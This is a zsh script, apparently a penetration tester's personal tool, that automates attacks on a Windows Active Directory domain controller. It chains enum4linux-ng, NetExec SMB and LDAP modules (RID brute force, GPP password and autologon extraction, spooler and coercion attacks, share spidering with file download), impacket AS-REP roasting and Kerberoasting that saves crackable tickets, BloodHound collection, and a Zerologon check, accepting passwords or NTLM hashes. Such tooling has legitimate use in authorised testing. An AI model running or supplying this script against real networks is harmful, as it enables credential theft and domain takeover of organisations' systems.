#!/bin/zsh

###########################################
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
RED_YELLOW="${C}[1;31;103m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m" #LightGray
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m" #DarkGray
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"

while getopts ":kd:p:u:H:t:" opt; do
  case $OPTARG in
   -*) echo "ERROR: Incorrect arguments."
  exit 1;;
  esac
  case $opt in
    k) useKerberos=$OPTARG
    ;;
    d) dnsDomainName=$OPTARG
    ;;
    u) domainUser=$OPTARG
    ;;
    p) domainPassword=$OPTARG
    ;;
    H) hash=$OPTARG
    ;;
    t) target=$OPTARG
    ;;
    "?") echo "Invalid option: -$OPTARG. Use -h to get help." >&2
    exit 1
    ;;
    ":") echo "Error: empty value for the argument -$OPTARG"
    exit 1
    ;;
  esac
done

function bloodhoundRun() {
  [[ -z $DCFQDN ]] && vared -p "DC hostname must be provided. Please enter manually:" -c DCFQDN 
  bloodhound-python -u $domainUser -p $domainPassword -dc $DCFQDN -d $dnsDomainName -ns $target -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn --zip
}

function roasting() {
    if [[ ! -z $hash ]]; then
        impacket-GetNPUsers -hashes $hash ${dnsDomainName}/${domainUser} -dc-ip $target
        impacket-GetUserSPNs -hashes $hash ${dnsDomainName}/${domainUser} -dc-ip $target -request -outputfile tgs.txt
    else
        impacket-GetNPUsers ${dnsDomainName}/${domainUser}:${domainPassword} -dc-ip $target
        impacket-GetUserSPNs ${dnsDomainName}/${domainUser}:${domainPassword} -dc-ip $target -request -outputfile tgs.txt
    fi
}

# checking arguments
printf "Domain: ${dnsDomainName}\n"
printf "User: ${domainUser}\n"
printf "Password: ${domainPassword}\n"
#[[ ! -v $useKerberos ]] && echo "Using Kerberos\n"
if [[ -v useKerberos ]]; then echo "Using Kerberos\n"; else echo "Using NTLM auth\n"; fi

[[ -v useKerberos ]] && [[ -z $dnsDomainName ]] && echo "ERROR: Domain name should be provided for Kerberos Authentication. Use -d <domain>." && exit 1
[[ ! -z $domainUser ]] && ([[ ! -z $domainPassword ]] || [[ ! -z $hash ]]) && authenticatedRun='1'
[[ -v useKerberos ]] && [[ ! -z $dnsDomainName ]] && kerberosAuth='1'
[[ -z $hash ]] && [[ ! -z $domainPassword ]] && pwAuth='1'
[[ ! -z $hash ]] && [[ -z $domainPassword ]] && hashAuth='1'

# setting kerberos authentication parameters for commands
if [[ $kerberosAuth == '1' ]]; then
    kerberosAuthFlag="-k"
    domainNameParam="-d ${dnsDomainName}"
else
# left empty, use NTLM
    kerberosAuthFlag=""
    domainNameParam=""
fi

# switching "password" and "hash" parameters for commands (password or NTLM hash)
if [[ $hashAuth == '1' ]]; then
    passwordParam="-H $hash"
elif [[ $pwAuth == '1' ]]; then
    passwordParam="-p ${domainPassword}"
else
    passwordParam='-p ""'
fi

# synchronize time with a DC for Kerberos
echo "Trying to syncronize time with the Domain Controller"
sudo rdate -n $target

#trap ' ' INT

echo "${YELLOW}[*] Running enum4linux...${NC}"
if [[ -z $domainUser ]]; then
    echo "enum4linux-ng -A $target" | zsh | tee enum4linux-$target-$domainUser.log
else    
    echo "enum4linux-ng -A $target -u $domainUser $passwordParam" | zsh | tee enum4linux-$target-$domainUser.log
fi

# SMB
echo "${YELLOW}[*] Running basic SMB enum...${NC}"
echo "nxc smb $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam --shares --pass-pol --loggedon-users" | zsh | tee smb_basic_enum_$domainUser.log
echo "${YELLOW}[*] Enumerating users via RID bruteforce...${NC}" | tee -a smb_basic_enum_$domainUser.log
echo "nxc smb $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam --rid-brute 8000" | zsh | tee rid-brute-${domainUser}-raw.log
echo "${YELLOW}[*] Enumerating users via RPC...${NC}" | tee -a smb_basic_enum_$domainUser.log
echo "nxc smb $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam --users" | zsh | tee smb_domain_users_${domainUser}_raw.txt
cat rid-brute-${domainUser}-raw.log | grep SidTypeUser | awk '{print $6}' | cut -d '\' -f2 | grep -E '^[0-9A-Za-z\._\$]+$' --only-match | grep -v -i "administrator\|krbtgt\|guest" > rid-brute-${domainUser}-users.txt
cat smb_domain_users_${domainUser}_raw.txt | awk '{print $5}' | grep -E '^[0-9A-Za-z\._]+$' --only-match | grep -v -i "administrator\|krbtgt\|guest" > smb_domain_users_$domainUser.txt


echo "${YELLOW}[*] Spidering shares...${NC}" | tee -a smb_basic_enum_$domainUser.log
echo "${YELLOW}[*] Checking for GPP passwords, autologon info and certificate authorities${NC}" | tee -a smb_basic_enum_$domainUser.log
echo "${YELLOW}[*] Checking for spooler service, trying coercing attacks...${NC}" | tee -a smb_basic_enum_$domainUser.log
echo "nxc smb $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam -M gpp_autologin -M gpp_password -M spooler -M coerce_plus -M spider_plus -o DOWNLOAD_FLAG=1 OUTPUT_FOLDER=`pwd`" | zsh | tee -a smb_basic_enum_$domainUser.log

#nxc smb $target -u '$domainUser' -p "$domainPassword" -M spooler -M coerce_plus | tee -a smb_basic_enum_$domainUser.log
#nxc smb $target -u '$domainUser' -p "$domainPassword" -M spider_plus -o DOWNLOAD_FLAG=1 OUTPUT_FOLDER=`pwd` | tee -a smb_basic_enum_$domainUser.log

# LDAP
#echo "nxc ldap $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam -M adcs" | zsh | tee -a ldap_basic_enum_$domainUser.log 

echo "${YELLOW}[*] Running basic LDAP enum...${NC}" | tee -a ldap_basic_enum_$domainUser.log
echo "${YELLOW}[*] Searching for Certificate Services...${NC}" | tee -a ldap_basic_enum_$domainUser.log
echo "nxc ldap $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam  -M adcs" | zsh | tee -a ldap_basic_enum_$domainUser.log
echo "${YELLOW}[*] Enumerating users via LDAP...${NC}" | tee -a ldap_basic_enum_$domainUser.log
echo "nxc ldap $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam --users-export ldap-domain-users.txt" | zsh
echo "${YELLOW}[*] Enumerating groups, accounts set for delegation and GMSA accounts...${NC}" | tee -a ldap_basic_enum_$domainUser.log
echo "nxc ldap $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam --groups --get-sid --find-delegation --trusted-for-delegation --gmsa" | zsh | tee -a ldap_basic_enum_$domainUser.log

if [[ $authenticatedRun == '1' ]]; then
    [[ -z $dnsDomainName ]] && dnsDomainName=`grep 'DNS domain:' enum4linux-$target-$domainUser.log | /bin/cut -d ' ' -f 3`
    DCFQDN=`grep 'FQDN:' enum4linux-$target-$domainUser.log | /bin/cut -d ' ' -f 2`
    echo
    echo
    echo "${GREEN}Domain: ${dnsDomainName}${NC}"
    echo "${GREEN}Domain Controller: ${DCFQDN}${NC}"
    echo
    vared -p "All is correct?[y]" -c dc_confirm
    if [[ $dc_confirm == 'y' ]]; then
        echo "Searching for users with disabled Kerberos Preauthentication..."
        roasting
        bloodhoundRun
    else
        vared -p "Please enter DNS name of the domain:" -c dnsDomainName
        vared -p "Please enter DNS name of the domain controller:" -c DCFQDN
        echo "Searching for users with disabled Kerberos Preauthentication..."
        roasting
        bloodhoundRun
    fi
fi

# need to start neo4j deamon
sudo neo4j start
sleep 5
# loading BloodHound UI
/home/shyngys/Tools/BloodHound-linux-x64/BloodHound --no-sandbox &

echo "${YELLOW}[*] Testing the Domain Controller for Zerologon...${NC}" | tee -a smb_basic_enum_$domainUser.log
echo "nxc smb $target -u '$domainUser' $passwordParam $kerberosAuthFlag $domainNameParam -M zerologon" | zsh | tee -a smb_basic_enum_$domainUser.log